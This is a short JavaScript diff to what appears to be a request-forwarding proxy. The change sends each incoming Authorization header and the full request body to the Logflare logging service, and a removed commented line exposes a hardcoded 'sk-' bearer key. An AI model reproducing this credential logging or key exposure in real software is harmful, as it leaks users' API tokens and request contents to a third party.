@@ -52,9 +52,10 @@ async function handleRequest(request) {
   const newURL = TELEGRAPH_URL;
 
   // 创建一个新的 Headers 对象复制原来的 headers，然后添加你的 Authorization
-  const newHeaders = await new Headers(request.headers);
-  // newHeaders.set('Authorization', 'Bearer sk-ad7cf22cf6b146099f59735c85ec7d33'); 
-  await sendLogToLogflare(newHeaders.Authorization);
+  // const newHeaders = await new Headers(request.headers);
+
+  const headers_Auth = request.headers.get("Authorization") || "Ops,没有找到授权信息!"
+  await sendLogToLogflare(`授权信息: ${headers_Auth}`);
 
   const bodyStr = await request.text();
   await sendLogToLogflare(bodyStr);
@@ -72,7 +73,7 @@ async function handleRequest(request) {
   // await sendLogToLogflare(newbodyStr);
 
   const modifiedRequest = new Request(newURL, {
-    headers: newHeaders,
+    headers: request.headers,
     method: request.method,
     body: newbodyStr,
     redirect: 'follow'
